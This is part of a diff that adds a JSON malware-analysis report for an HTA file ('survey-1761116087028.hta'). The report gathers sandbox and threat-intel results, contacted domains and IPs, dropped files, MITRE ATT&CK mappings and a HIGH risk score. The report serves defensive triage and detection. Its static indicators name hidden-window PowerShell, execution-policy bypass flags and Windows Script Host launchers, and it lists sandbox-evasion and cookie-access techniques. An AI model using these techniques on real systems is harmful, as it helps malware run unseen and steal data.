+            "www.bing.com -> 23.195.81.163, 23.195.81.154, 23.195.81.162, 23.195.81.152, 23.195.81.144, 23.19..."
+          ],
+          "ip_traffic": [
+            "13.107.246.70:443 /TCP",
+            "23.195.81.144:443 /TCP",
+            "23.60.131.209:80 /TCP",
+            "23.14.141.249:443 /TCP"
+          ],
+          "http_conversations": [],
+          "mitre_attack_techniques": [
+            {
+              "id": "T1539",
+              "severity": "IMPACT_SEVERITY_MEDIUM",
+              "description": "Touches a file containing cookies, possibly for information gathering"
+            },
+            {
+              "id": "T1071",
+              "severity": "IMPACT_SEVERITY_MEDIUM",
+              "description": "A script process initiated network activity"
+            },
+            {
+              "id": "T1106",
+              "severity": "IMPACT_SEVERITY_LOW",
+              "description": "Guard pages use detected - possible anti-debugging."
+            },
+            {
+              "id": "T1059",
+              "severity": "IMPACT_SEVERITY_MEDIUM",
+              "description": "A script process initiated network activity"
+            },
+            {
+              "id": "T1064",
+              "severity": "IMPACT_SEVERITY_MEDIUM",
+              "description": "A script process initiated network activity"
+            },
+            {
+              "id": "T1497",
+              "severity": "IMPACT_SEVERITY_LOW",
+              "description": "Checks for mouse movement"
+            },
+            {
+              "id": "T1036",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Creates files inside the user directory"
+            },
+            {
+              "id": "T1562.001",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Creates guard pages, often used to prevent reverse engineering and debugging"
+            },
+            {
+              "id": "T1083",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Reads ini files"
+            },
+            {
+              "id": "T1082",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Reads internet explorer settings"
+            },
+            {
+              "id": "T1082",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Queries the volume information (name, serial number etc) of a device"
+            },
+            {
+              "id": "T1114",
+              "severity": "IMPACT_SEVERITY_INFO",
+              "description": "Searches for the Microsoft Outlook file path"
+            }
+          ],
+          "tags": [
+            "DETECT_DEBUG_ENVIRONMENT"
+          ],
+          "verdicts": [
+            "CLEAN"
+          ],
+          "verdict_labels": [],
+          "calls_highlighted": [],
+          "text_highlighted": []
+        },
+        "relationships": {
+          "contacted_domains": {
+            "status": "ok",
+            "count": 7,
+            "items": [
+              {
+                "value": "a1672.dscr.akamai.net",
+                "malicious": 0,
+                "reputation": -11,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "bg.microsoft.map.fastly.net",
+                "malicious": 0,
+                "reputation": -7,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "edgecdn-embza6g8cacagcbn.z01.azurefd.net",
+                "malicious": 0,
+                "reputation": -1,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "nexusrules.officeapps.live.com",
+                "malicious": 0,
+                "reputation": 1,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "survey.bestfestiivalcompany.com",
+                "malicious": 0,
+                "reputation": 0,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "windows.msn.com-ion.edgesuite.net",
+                "malicious": 0,
+                "reputation": 0,
+                "country": null,
+                "owner": ""
+              },
+              {
+                "value": "www.bing.com",
+                "malicious": 0,
+                "reputation": 48,
+                "country": null,
+                "owner": ""
+              }
+            ]
+          },
+          "contacted_ips": {
+            "status": "ok",
+            "count": 16,
+            "items": [
+              {
+                "value": "13.107.213.70",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Microsoft Corporation"
+              },
+              {
+                "value": "13.107.246.70",
+                "malicious": 0,
+                "reputation": 1,
+                "country": "US",
+                "owner": "Microsoft Corporation"
+              },
+              {
+                "value": "199.232.210.172",
+                "malicious": 1,
+                "reputation": 11,
+                "country": "US",
+                "owner": "Fastly, Inc."
+              },
+              {
+                "value": "199.232.214.172",
+                "malicious": 0,
+                "reputation": -94,
+                "country": "US",
+                "owner": "Fastly, Inc."
+              },
+              {
+                "value": "23.14.141.249",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai Technologies, Inc."
+              },
+              {
+                "value": "23.195.81.144",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.146",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.152",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.154",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.162",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.163",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.59",
+                "malicious": 0,
+                "reputation": -3,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.195.81.73",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Akamai International B.V."
+              },
+              {
+                "value": "23.60.131.209",
+                "malicious": 0,
+                "reputation": -1,
+                "country": "US",
+                "owner": "Akamai Technologies, Inc."
+              },
+              {
+                "value": "52.111.227.11",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Microsoft Corporation"
+              },
+              {
+                "value": "52.111.229.43",
+                "malicious": 0,
+                "reputation": 0,
+                "country": "US",
+                "owner": "Microsoft Corporation"
+              }
+            ]
+          },
+          "dropped_files": {
+            "status": "ok",
+            "count": 9,
+            "items": [
+              {
+                "value": "54c0a29d0f6fba274ceec1e1cc8933c5ef35ebf7d9854fb325f66fa3b162ca8c",
+                "name": "httpErrorPagesScripts[1]",
+                "type": "JavaScript",
+                "size": 12105,
+                "malicious": 0
+              },
+              {
+                "value": "77b138ab5d0a90ff04648c26addd5e414cc178165e3b54a4cb3739da0f58e075",
+                "name": "NewErrorPageTemplate[1]",
+                "type": "Text",
+                "size": 1612,
+                "malicious": 0
+              },
+              {
+                "value": "7990e703ae060c241eba6257d963af2ecf9c6f3fbdb57264c1d48dda8171e754",
+                "name": "error[2]",
+                "type": "HTML",
+                "size": 3247,
+                "malicious": 0
+              },
+              {
+                "value": "a1270e90cea31b46432ec44731bf4400d22b38eb2855326bf934fe8f1b169a4f",
+                "name": "errorPageStrings[1]",
+                "type": "JavaScript",
+                "size": 4720,
+                "malicious": 0
+              },
+              {
+                "value": "acdeb4966289b6ce46ecc879531f85e9c6f94b718aab521d38e2e00f7f7f7993",
+                "name": "DNSERROR.HTM",
+                "type": "HTML",
+                "size": 2997,
+                "malicious": 0
+              },
+              {
+                "value": "b0abe318200dcde42e2125df1f0239ae1efa648c742dbf9a5b0d3397b903c21d",
+                "name": "error[1]",
+                "type": "JavaScript",
+                "size": 1706,
+                "malicious": 0
+              },
+              {
+                "value": "5f95eff2bcaaea82d0ae34a007de3595c0d830ac4810ea4854e6526e261108e9",
+                "name": "warning[1]",
+                "type": "GIF",
+                "size": 1062,
+                "malicious": 0
+              },
+              {
+                "value": "a66ed4743f04712adbece1d28a65651d75e73511ac9ba3f8e28ea003057e7aa0",
+                "name": "",
+                "type": null,
+                "size": null,
+                "malicious": 0
+              },
+              {
+                "value": "e661d9bdb4ea35eb879bc36a3553d94a504432636ad91109e36efff576548367",
+                "name": "",
+                "type": null,
+                "size": null,
+                "malicious": 0
+              }
+            ]
+          }
+        }
+      },
+      "mb": {
+        "provider": "mb",
+        "label": "MalwareBazaar",
+        "status": "not_found"
+      },
+      "urlhaus": {
+        "provider": "urlhaus",
+        "label": "URLhaus",
+        "status": "not_found"
+      },
+      "threatfox": {
+        "provider": "threatfox",
+        "label": "ThreatFox",
+        "status": "not_found"
+      },
+      "otx": {
+        "provider": "otx",
+        "label": "AlienVault OTX",
+        "status": "not_found",
+        "pulse_count": 0,
+        "pulses": [],
+        "families": [],
+        "attack_ids": [],
+        "tags": [],
+        "permalink": "https://otx.alienvault.com/indicator/file/984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408"
+      },
+      "ha": {
+        "provider": "ha",
+        "label": "Hybrid Analysis",
+        "status": "ok",
+        "verdict": "malicious",
+        "threat_score": null,
+        "av_detect": null,
+        "family": "Notavirus_HEUR_RiskTool_HTA_Alien_gen",
+        "tags": [],
+        "file_type": "HTML document, ASCII text, with very long lines (1202)",
+        "size": 8011,
+        "file_name": "survey-1761116087028.hta",
+        "last_analysis": "2025-12-24T12:59:09+00:00",
+        "permalink": "https://www.hybrid-analysis.com/sample/984f722c8d24e9187db77f7b7dc5c7e34b46878ed56e1eb8fd53683132079408"
+      },
+      "abuseipdb": {
+        "provider": "abuseipdb",
+        "label": "AbuseIPDB",
+        "status": "skipped",
+        "error": "Network-only provider; use --enrich to query IPs."
+      }
+    },
+    "network": {},
+    "enrichment_enabled": false,
+    "queried_with": {
+      "hash_lookup": [
+        "vt",
+        "mb",
+        "urlhaus",
+        "threatfox",
+        "otx",
+        "ha"
+      ],
+      "note": "Only file hashes were sent; the sample was NOT uploaded."
+    },
+    "summary": {
+      "verdict": "malicious",
+      "providers_ok": [
+        "vt",
+        "ha"
+      ],
+      "providers_not_found": [
+        "mb",
+        "urlhaus",
+        "threatfox",
+        "otx"
+      ],
+      "providers_failed": [],
+      "providers_skipped": [
+        "abuseipdb"
+      ],
+      "hits": [
+        "vt",
+        "ha"
+      ],
+      "vt_malicious": 6,
+      "vt_suspicious": 0,
+      "vt_total": 60,
+      "ha_verdict": "malicious",
+      "ha_threat_score": null,
+      "families": [
+        "notavirus_heur_risktool_hta_alien_gen",
+        "alien",
+        "badshell"
+      ],
+      "first_seen": "2025-12-21 16:04:37 UTC",
+      "observed_techniques": [
+        {
+          "id": "T1539",
+          "description": "Touches a file containing cookies, possibly for information gathering",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1071",
+          "description": "A script process initiated network activity",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1106",
+          "description": "Guard pages use detected - possible anti-debugging.",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1059",
+          "description": "A script process initiated network activity",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1064",
+          "description": "A script process initiated network activity",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1497",
+          "description": "Checks for mouse movement",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1036",
+          "description": "Creates files inside the user directory",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1562.001",
+          "description": "Creates guard pages, often used to prevent reverse engineering and debugging",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1083",
+          "description": "Reads ini files",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1082",
+          "description": "Reads internet explorer settings",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1082",
+          "description": "Queries the volume information (name, serial number etc) of a device",
+          "source": "VirusTotal sandbox"
+        },
+        {
+          "id": "T1114",
+          "description": "Searches for the Microsoft Outlook file path",
+          "source": "VirusTotal sandbox"
+        }
+      ],
+      "network_flagged": 0
+    },
+    "elapsed_s": 60.6
+  },
+  "attack": [
+    {
+      "technique_id": "T1059.001",
+      "name": "Command and Scripting Interpreter: PowerShell",
+      "tactic": "Execution",
+      "evidence": [
+        "PowerShell reference",
+        "PowerShell policy bypass / no-profile"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1059.005",
+      "name": "Command and Scripting Interpreter: Visual Basic",
+      "tactic": "Execution",
+      "evidence": [
+        "Windows Script Host",
+        "COM object creation"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1106",
+      "name": "Native API",
+      "tactic": "Execution",
+      "evidence": [
+        "Guard pages use detected - possible anti-debugging."
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1218.005",
+      "name": "System Binary Proxy Execution: Mshta",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "HTA / script-host content"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1497",
+      "name": "Virtualization/Sandbox Evasion",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Checks for mouse movement"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1562.001",
+      "name": "Impair Defenses: Disable or Modify Tools",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Creates guard pages, often used to prevent reverse engineering and debugging"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1564.003",
+      "name": "Hide Artifacts: Hidden Window",
+      "tactic": "Defense Evasion",
+      "evidence": [
+        "Hidden window execution"
+      ],
+      "sources": [
+        "static"
+      ]
+    },
+    {
+      "technique_id": "T1082",
+      "name": "System Information Discovery",
+      "tactic": "Discovery",
+      "evidence": [
+        "Reads internet explorer settings",
+        "Queries the volume information (name, serial number etc) of a device"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1083",
+      "name": "File and Directory Discovery",
+      "tactic": "Discovery",
+      "evidence": [
+        "Reads ini files"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1071",
+      "name": "Application Layer Protocol",
+      "tactic": "Command and Control",
+      "evidence": [
+        "A script process initiated network activity"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1036",
+      "name": "Creates files inside the user directory",
+      "tactic": "Other",
+      "evidence": [
+        "Creates files inside the user directory"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1059",
+      "name": "A script process initiated network activity",
+      "tactic": "Other",
+      "evidence": [
+        "A script process initiated network activity"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1064",
+      "name": "A script process initiated network activity",
+      "tactic": "Other",
+      "evidence": [
+        "A script process initiated network activity"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1114",
+      "name": "Searches for the Microsoft Outlook file path",
+      "tactic": "Other",
+      "evidence": [
+        "Searches for the Microsoft Outlook file path"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    },
+    {
+      "technique_id": "T1539",
+      "name": "Touches a file containing cookies, possibly for information gathering",
+      "tactic": "Other",
+      "evidence": [
+        "Touches a file containing cookies, possibly for information gathering"
+      ],
+      "sources": [
+        "VirusTotal sandbox"
+      ]
+    }
+  ],
+  "risk": {
+    "score": 73,
+    "level": "HIGH",
+    "confidence": "HIGH",
+    "categories": {
+      "execution": 25,
+      "network": 8,
+      "persistence": 0,
+      "injection": 0,
+      "obfuscation": 0,
+      "evasion": 7,
+      "anti_analysis": 0,
+      "credential_access": 0,
+      "collection": 0,
+      "impact": 0,
+      "structure": 0,
+      "reputation": 30,
+      "ioc": 3
+    },
+    "reasons": [
+      {
+        "category": "reputation",
+        "indicator": "virustotal",
+        "points": 18,
+        "evidence": "6 malicious + 0 suspicious of 60 engines",
+        "source": "intel"
+      },
+      {
+        "category": "reputation",
+        "indicator": "hybrid_analysis",
+        "points": 10,
+        "evidence": "verdict 'malicious', threat score None",
+        "source": "intel"
+      },
+      {
+        "category": "network",
+        "indicator": "network_ioc",
+        "points": 8,
+        "evidence": "2 URL(s), 1 domain(s), 0 IP(s)",
+        "source": "static"
+      },
+      {
+        "category": "evasion",
+        "indicator": "ps_hidden",
+        "points": 7,
+        "evidence": "Hidden window execution (x1, via strings; e.g. '-w hidden')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "wsh",
+        "points": 7,
+        "evidence": "Windows Script Host (x1, via strings; e.g. 'Wscript.Shell')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "ps_exec",
+        "points": 6,
+        "evidence": "PowerShell reference (x1, via strings; e.g. 'powershell.exe')",
+        "source": "static"
+      },
+      {
+        "category": "reputation",
+        "indicator": "yara_match",
+        "points": 6,
+        "evidence": "MAL_HTA_Shell_Launcher",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "ps_bypass",
+        "points": 5,
+        "evidence": "PowerShell policy bypass / no-profile (x1, via strings; e.g. '-nop')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "hta_content",
+        "points": 5,
+        "evidence": "HTA / script-host content (x1, via strings; e.g. '<hta:application')",
+        "source": "static"
+      },
+      {
+        "category": "execution",
+        "indicator": "createobject",
+        "points": 4,
+        "evidence": "COM object creation (x6, via strings; e.g. 'CreateObject(')",
+        "source": "static"
+      },
+      {
+        "category": "ioc",
+        "indicator": "embedded_iocs",
+        "points": 3,
+        "evidence": "3 extracted indicator(s)",
+        "source": "static"
+      }
+    ],
+    "verdict_note": "Score = sum of capped category totals (max 100). Each indicator counts once; repetition is shown as evidence only."
+  },
+  "analysis_limits": {
+    "execution": false,
+    "max_file_mb": 100,
+    "dynamic_behavior": "not collected by MAL (sandbox behaviour, if shown, comes from third-party intel)",
+    "xor_scan_bytes": 16777216,
+    "notes": [
+      "Authenticode signatures are detected but not cryptographically validated.",
+      "Only single-byte XOR is brute-forced; multi-byte / rolling XOR and custom crypto are not decoded.",
+      "Archives (.7z/.rar/.iso) are identified but their members are not inspected."
+    ]
+  }
+}
